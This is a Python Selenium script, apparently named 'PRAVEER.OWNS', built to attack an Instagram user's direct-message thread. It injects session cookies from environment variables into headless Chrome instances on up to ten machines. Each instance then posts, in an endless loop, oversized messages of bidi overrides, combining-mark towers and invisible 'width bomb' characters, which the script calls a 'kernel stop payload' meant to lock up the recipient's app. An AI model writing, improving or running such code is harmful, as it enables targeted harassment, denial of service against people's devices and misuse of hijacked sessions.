# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (DOMAIN-FIX)
# 📅 STATUS: 10-MACHINES | 3-IDS | COOKIE-STABILITY

import os, time, random, sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def get_kernel_stop_payload(target_name):
    u_id = random.randint(1000, 9999)
    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊ᴇ𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}\n"
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(250))
    z_tower = "̸" * 700 
    width_bomb = "\u2800\u00A0" * 120
    lines = [header, shifter]
    for i in range(25):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{i}{z_tower}")
    return "\n".join(lines)[:9990]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def main():
    machine_id = int(os.environ.get("MACHINE_ID", "1"))
    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()

    cookie_index = (machine_id - 1) % len(raw_cookies)
    current_cookie = raw_cookies[cookie_index].strip()
    
    driver = None
    try:
        print(f"📡 [Machine {machine_id}] Launching Driver...")
        driver = get_driver()
        
        # 🛠️ THE FIX: Visit robots.txt first to set domain context
        print(f"📡 [Machine {machine_id}] Setting Domain Context...")
        driver.get("https://www.instagram.com/robots.txt")
        time.sleep(3) # Ensure the domain is registered in the browser
        
        print(f"📡 [Machine {machine_id}] Injecting Session ID...")
        # We explicitly set the domain to match exactly what the browser sees
        driver.add_cookie({
            'name': 'sessionid', 
            'value': current_cookie, 
            'domain': '.instagram.com', 
            'path': '/', 
            'secure': True
        })
        
        print(f"📡 [Machine {machine_id}] Accessing Chat...")
        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
        
        # Stability Wait
        wait = WebDriverWait(driver, 60)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        print(f"✅ [Machine {machine_id}] Target Locked.")

        while True:
            for _ in range(2):
                payload = get_kernel_stop_payload(target_name)
                # Faster injection method
                driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
                box.send_keys(Keys.ENTER)
                time.sleep(1.5)

            print(f"💀 [Machine {machine_id}] Pulse Delivered.")
            time.sleep(random.uniform(15, 20))
            
            if random.random() < 0.1:
                driver.refresh()
                time.sleep(10)

    except Exception as e:
        print(f"❌ [Machine {machine_id}] Fatal Error: {str(e)}")
        if driver:
            driver.quit()
        sys.exit(1)

if __name__ == "__main__":
    main()
